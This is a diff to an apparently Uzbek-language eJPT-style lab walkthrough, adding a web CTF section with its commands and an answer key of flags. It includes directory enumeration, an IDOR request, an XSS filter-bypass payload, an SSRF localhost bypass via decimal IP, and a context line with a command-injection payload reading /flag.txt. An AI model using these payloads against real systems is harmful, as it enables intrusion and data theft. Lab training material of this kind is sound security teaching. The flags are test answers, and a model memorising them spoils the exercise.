@@ -169,6 +169,45 @@ proxychains curl "http://10.10.10.20:8080/ping?host=127.0.0.1;cat /flag.txt"
 
 ---
 
+## Web CTF — «Nimbus Reports» (10.10.20.60:8085) — 4 web zaiflik
+
+SSH'siz nishon — brauzer + **Burp** bilan buziladi. Avval enumeratsiya (path'lar har xil ro'yxatda):
+```bash
+gobuster dir -u http://10.10.20.60:8085/ -w /usr/share/wordlists/dirb/common.txt -x php,txt
+#  -> download.php, search.php, fetch.php, admin-metrics.php, flag.php, login.php ...
+# storage-backup common'da YO'Q — kattaroq ro'yxat kerak:
+gobuster dir -u http://10.10.20.60:8085/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x txt
+#  -> storage-backup/
+```
+
+**① IDOR — `download.php`:** UI faqat #1..12 ni beradi, `report_id` POST tanasida. Burp bilan `report_id=0`:
+```bash
+curl -s -X POST -d 'report_id=0' http://10.10.20.60:8085/download.php
+```
+➡️ `EJPT{id0r_burp_r3p0rt_z3r0}`
+
+**② Information disclosure — `storage-backup/`:** ochiq katalog ro'yxati, flag base64 ko'rinishida:
+```bash
+curl -s http://10.10.20.60:8085/storage-backup/                                  # -> nimbus_db_*.sql.txt
+curl -s http://10.10.20.60:8085/storage-backup/nimbus_db_2024-01-15.sql.txt | grep base64
+echo 'RUpQVHszbmMwZDNkX2I0Y2t1cF9sMzRrfQ==' | base64 -d
+```
+➡️ `EJPT{3nc0d3d_b4ckup_l34k}`
+
+**③ Reflected XSS + WAF bypass — `search.php`:** `<script>`/`onerror` bloklangan. `<svg onload>` bilan aylanib o'tib, faqat same-origin `/flag.php` ni o'qing (brauzerda):
+```
+http://10.10.20.60:8085/search.php?q=<svg onload="fetch('/flag.php').then(r=>r.text()).then(alert)">
+```
+➡️ alert → `EJPT{w4f_byp4ss_x55_r3fl3ct}`  (curl bilan tekshirish: `-H 'Sec-Fetch-Site: same-origin'`)
+
+**④ SSRF + decimal bypass — `fetch.php`:** `127.0.0.1`/`localhost` satri bloklangan; 127.0.0.1 = **2130706433**:
+```bash
+curl -s "http://10.10.20.60:8085/fetch.php?url=http://2130706433/admin-metrics.php"
+```
+➡️ `EJPT{ssrf_d3c1m4l_2_l0c4l}`
+
+---
+
 ## Barcha flaglar
 
 | # | Mashina | Flag |
@@ -184,5 +223,9 @@ proxychains curl "http://10.10.10.20:8080/ping?host=127.0.0.1;cat /flag.txt"
 | 5 | smb-03 (user) | `EJPT{smb_null_cr3ds_l00t}` |
 | 6 | smb-03 (root) | `EJPT{cr0n_wr1t4bl3_r00t}` |
 | 7 | internal-04 (final) | `EJPT{p1v0t_1nt3rnal_cmd1nj}` |
+| C1 | ctf-web · IDOR | `EJPT{id0r_burp_r3p0rt_z3r0}` |
+| C2 | ctf-web · info disclosure | `EJPT{3nc0d3d_b4ckup_l34k}` |
+| C3 | ctf-web · XSS (WAF bypass) | `EJPT{w4f_byp4ss_x55_r3fl3ct}` |
+| C4 | ctf-web · SSRF (decimal) | `EJPT{ssrf_d3c1m4l_2_l0c4l}` |
 
-Flaglarni portalning **«Amaliy Lab»** sahifasida topshirib, progressni kuzating.
+SSH-mashina flaglarini portalning **«Amaliy Lab»**, web-CTF flaglarini **«CTF»** sahifasida topshiring.
